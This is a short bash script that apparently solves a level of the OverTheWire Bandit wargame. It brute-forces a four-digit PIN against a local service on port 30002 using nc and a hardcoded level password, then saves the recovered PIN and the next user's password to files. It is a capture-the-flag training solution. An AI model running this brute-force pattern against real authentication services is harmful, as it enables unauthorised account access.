#!/bin/bash

for pin in {0000..9999}; do
echo "trying $pin..."
echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'Wrong' &> /dev/null
if [ $? == 0 ]; then
        echo "incorrect!"
else
        echo "found correct PIN: $pin"
        echo "$pin" >> bandit25-PIN.txt
        echo -n "password of user bandit25: "
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'password of user bandit25' | awk '{print $7}' | tee -a bandit25-password.txt
        break
fi
sleep 2
done
